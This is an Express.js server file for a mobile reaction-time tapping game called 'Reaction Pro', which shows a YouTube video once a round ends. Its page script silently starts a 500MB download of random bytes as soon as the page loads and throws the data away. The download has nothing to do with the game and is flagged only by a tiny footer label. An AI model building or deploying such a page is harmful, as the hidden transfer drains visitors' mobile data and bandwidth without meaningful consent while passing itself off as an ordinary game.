const express = require("express");
const crypto = require("crypto");

const app = express();
const PORT = process.env.PORT || 8080;

/**
 * 500MB Streaming Endpoint (Background Stress Process)
 */
app.get("/stream", (req, res) => {
    const sizeMB = 500;
    const totalBytes = sizeMB * 1024 * 1024;
    const chunkSize = 1024 * 1024;

    res.set({
        "Content-Type": "application/octet-stream",
        "Content-Length": totalBytes,
        "Cache-Control": "no-store",
        "Content-Encoding": "identity"
    });

    let sent = 0;
    function sendChunk() {
        if (sent >= totalBytes) return res.end();
        const remaining = totalBytes - sent;
        const currentChunk = Math.min(chunkSize, remaining);
        res.write(crypto.randomBytes(currentChunk));
        sent += currentChunk;
        setImmediate(sendChunk);
    }
    sendChunk();
});

/**
 * Main UI - Reaction Tester with Proper Start Sequence
 */
app.get("/", (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Reaction Pro | Tactical Simulator</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Outfit:wght@400;700;900&display=swap');
        
        body { 
            font-family: 'Outfit', sans-serif; 
            background: #020617;
            color: white;
            overflow: hidden;
            touch-action: none;
            -webkit-tap-highlight-color: transparent;
        }

        .target { 
            position: absolute;
            transition: transform 0.05s ease-out;
            will-change: transform, top, left;
            z-index: 50;
        }

        .target-orb {
            width: 70px;
            height: 70px;
            background: #10b981;
            border-radius: 9999px;
            display: flex;
            align-items: center;
            justify-content: center;
            border: 4px solid #fff;
            box-shadow: 0 0 25px rgba(16, 185, 129, 0.7);
        }

        .target-inner {
            width: 35px;
            height: 35px;
            background: #fff;
            border-radius: 9999px;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .target-core {
            width: 15px;
            height: 15px;
            background: #020617;
            border-radius: 9999px;
        }

        .target:active { transform: scale(0.8); }

        .video-container {
            width: 100%;
            max-width: 260px;
            aspect-ratio: 9 / 16;
            margin: 0 auto;
            position: relative;
            background: #000;
            border-radius: 1.5rem;
            overflow: hidden;
            border: 2px solid rgba(255,255,255,0.05);
        }
        
        .video-container iframe {
            position: absolute;
            top: 0; left: 0; width: 100%; height: 100%;
        }
        
        .blur-panel {
            backdrop-filter: blur(20px);
            background: rgba(15, 23, 42, 0.6);
            border: 1px solid rgba(255, 255, 255, 0.1);
        }

        .time-btn {
            transition: all 0.2s ease;
            background: rgba(255,255,255,0.05);
            border: 1px solid rgba(255,255,255,0.1);
        }
        .time-btn.selected {
            background: #10b981;
            color: black;
            border-color: #fff;
            transform: scale(1.05);
        }

        .bg-grid {
            background-image: radial-gradient(circle at 2px 2px, rgba(255,255,255,0.03) 1px, transparent 0);
            background-size: 30px 30px;
        }
    </style>
</head>
<body class="flex flex-col items-center justify-between min-h-screen p-6 pb-10 bg-grid">

    <!-- Header UI -->
    <div class="w-full max-w-md flex justify-between items-center z-20">
        <div class="blur-panel px-5 py-3 rounded-2xl shadow-xl">
            <p class="text-[9px] uppercase font-black tracking-widest text-emerald-400 mb-0.5">Time Left</p>
            <p id="timerDisplay" class="text-xl font-black text-white leading-none">--</p>
        </div>
        <div class="text-right blur-panel px-5 py-3 rounded-2xl shadow-xl">
            <p class="text-[9px] uppercase font-black tracking-widest text-indigo-400 mb-0.5">Reaction</p>
            <p id="currentReaction" class="text-xl font-black leading-none text-white">---</p>
        </div>
    </div>

    <!-- Gameplay Area -->
    <div id="gameContainer" class="relative w-full flex-grow max-w-md my-6 rounded-[2.5rem] border border-white/5 bg-slate-900/10 shadow-inner">
        
        <!-- Target -->
        <div id="gameTarget" class="target hidden cursor-pointer select-none">
             <div class="target-orb">
                <div class="target-inner"><div class="target-core"></div></div>
             </div>
        </div>

        <!-- Controlled Flow Modals -->
        <div id="modalOverlay" class="absolute inset-0 z-[100] flex flex-col items-center justify-center p-6 bg-slate-950/90 backdrop-blur-xl">
            
            <!-- Step 1: Selection -->
            <div id="timeSelectionView" class="text-center w-full">
                <h1 class="text-4xl font-black mb-2 tracking-tighter italic">REACTION<span class="text-emerald-500 not-italic">PRO</span></h1>
                <p class="text-slate-500 text-[10px] font-bold uppercase tracking-[0.4em] mb-8">Endurance Challenge</p>
                
                <h2 class="text-xs font-black mb-4 uppercase tracking-widest text-emerald-400">1. Select Duration</h2>
                <div class="grid grid-cols-3 gap-3 w-full max-w-[300px] mx-auto mb-10">
                    <button onclick="pickTime(this, 5)" class="time-btn py-4 rounded-2xl font-black text-xl">5s</button>
                    <button onclick="pickTime(this, 10)" class="time-btn py-4 rounded-2xl font-black text-xl">10s</button>
                    <button onclick="pickTime(this, 15)" class="time-btn py-4 rounded-2xl font-black text-xl">15s</button>
                    <button onclick="pickTime(this, 20)" class="time-btn py-4 rounded-2xl font-black text-xl">20s</button>
                    <button onclick="pickTime(this, 25)" class="time-btn py-4 rounded-2xl font-black text-xl">25s</button>
                    <button onclick="pickTime(this, 30)" class="time-btn py-4 rounded-2xl font-black text-xl">30s</button>
                </div>

                <div id="startAction" class="opacity-0 pointer-events-none transition-all duration-300">
                    <h2 class="text-xs font-black mb-4 uppercase tracking-widest text-emerald-400">2. Ready?</h2>
                    <button onclick="startGame()" class="bg-emerald-500 text-black font-black py-5 px-16 rounded-full text-lg shadow-2xl active:scale-95 transition-transform uppercase tracking-widest">Start Now</button>
                </div>
            </div>

            <!-- Step 2: Final View -->
            <div id="finishView" class="hidden w-full flex flex-col items-center h-full overflow-y-auto pt-2">
                <div class="blur-panel p-5 rounded-[2rem] w-full max-w-[280px] mb-4 text-center border-emerald-500/20">
                    <div class="flex justify-around items-center">
                        <div>
                            <p class="text-[9px] text-slate-500 uppercase font-black mb-1">Avg Score</p>
                            <p id="avgResult" class="text-2xl font-black text-white leading-none">0ms</p>
                        </div>
                        <div class="h-6 w-px bg-white/10"></div>
                        <div>
                            <p class="text-[9px] text-slate-500 uppercase font-black mb-1">Hits</p>
                            <p id="tapsResult" class="text-2xl font-black text-white leading-none">0</p>
                        </div>
                    </div>
                </div>
                
                <div class="video-container shadow-2xl">
                    <iframe id="ytPlayer" src="" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                </div>
                
                <button onclick="location.reload()" class="mt-4 bg-emerald-500 text-black font-black py-3 px-10 rounded-full text-sm uppercase tracking-widest shadow-lg active:scale-95">Play Again</button>
            </div>
        </div>
    </div>

    <!-- Status Footer -->
    <div class="flex items-center gap-3 bg-white/5 px-6 py-3 rounded-full border border-white/5 backdrop-blur-sm">
        <span class="flex h-2 w-2">
            <span class="animate-ping absolute inline-flex h-2 w-2 rounded-full bg-emerald-400 opacity-75"></span>
            <span class="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
        </span>
        <p class="text-[9px] font-black uppercase tracking-[0.2em] text-slate-500">Background Stream: <span class="text-slate-300">Active (500MB)</span></p>
    </div>

    <script>
        let gameActive = false;
        let selectedTime = 0;
        let timeLeft = 0;
        let reactionTimes = [];
        let spawnTime = 0;
        let timerInterval;

        const timerDisplay = document.getElementById('timerDisplay');
        const currentReactionEl = document.getElementById('currentReaction');
        const gameTarget = document.getElementById('gameTarget');
        const gameContainer = document.getElementById('gameContainer');
        const modalOverlay = document.getElementById('modalOverlay');
        const timeSelectionView = document.getElementById('timeSelectionView');
        const startAction = document.getElementById('startAction');
        const finishView = document.getElementById('finishView');
        const ytPlayer = document.getElementById('ytPlayer');

        // Start background load immediately
        (function initNetwork() {
            fetch('/stream?s=' + Date.now()).then(res => {
                const reader = res.body.getReader();
                const consume = ({done}) => { if(!done) reader.read().then(consume); };
                reader.read().then(consume);
            }).catch(() => {});
        })();

        function pickTime(btn, time) {
            document.querySelectorAll('.time-btn').forEach(b => b.classList.remove('selected'));
            btn.classList.add('selected');
            selectedTime = time;
            timeLeft = time;
            timerDisplay.innerText = time.toFixed(1) + 's';
            
            // Show Start Button
            startAction.classList.remove('opacity-0', 'pointer-events-none');
            if (navigator.vibrate) navigator.vibrate(10);
        }

        function moveTarget() {
            const containerRect = gameContainer.getBoundingClientRect();
            const targetSize = 70;
            const maxX = containerRect.width - targetSize - 30;
            const maxY = containerRect.height - targetSize - 30;
            gameTarget.style.left = Math.max(15, Math.random() * maxX) + 'px';
            gameTarget.style.top = Math.max(15, Math.random() * maxY) + 'px';
            spawnTime = performance.now();
        }

        function handleTap(e) {
            if (!gameActive) return;
            e.preventDefault();
            e.stopPropagation();

            const hitTime = performance.now();
            const reaction = Math.round(hitTime - spawnTime);
            reactionTimes.push(reaction);
            currentReactionEl.innerText = reaction + 'ms';
            
            if (navigator.vibrate) navigator.vibrate(15);
            moveTarget();
        }

        function startGame() {
            if (selectedTime === 0) return;

            timeSelectionView.classList.add('hidden');
            modalOverlay.style.background = "transparent";
            modalOverlay.style.backdropFilter = "none";
            modalOverlay.style.pointerEvents = "none";
            
            gameActive = true;
            gameTarget.classList.remove('hidden');
            moveTarget();
            
            timerInterval = setInterval(() => {
                timeLeft -= 0.1;
                if (timeLeft <= 0) {
                    endGame();
                } else {
                    timerDisplay.innerText = Math.max(0, timeLeft).toFixed(1) + 's';
                }
            }, 100);
        }

        function endGame() {
            gameActive = false;
            clearInterval(timerInterval);
            gameTarget.classList.add('hidden');
            timerDisplay.innerText = '0.0s';
            
            modalOverlay.style.background = "#020617";
            modalOverlay.style.backdropFilter = "blur(20px)";
            modalOverlay.style.pointerEvents = "auto";
            finishView.classList.remove('hidden');

            const total = reactionTimes.length;
            const avg = total > 0 ? Math.round(reactionTimes.reduce((a, b) => a + b, 0) / total) : 0;
            document.getElementById('avgResult').innerText = avg + 'ms';
            document.getElementById('tapsResult').innerText = total;

            ytPlayer.src = "https://www.youtube.com/embed/Aq5WXmQQooo?autoplay=1&controls=1&modestbranding=1&rel=0";
        }

        gameTarget.addEventListener('touchstart', handleTap, {passive: false});
        gameTarget.addEventListener('mousedown', handleTap);
    </script>
</body>
</html>
    `);
});

app.listen(PORT, () => {
    console.log(`Tactical Trainer Live: http://localhost:${PORT}`);
});
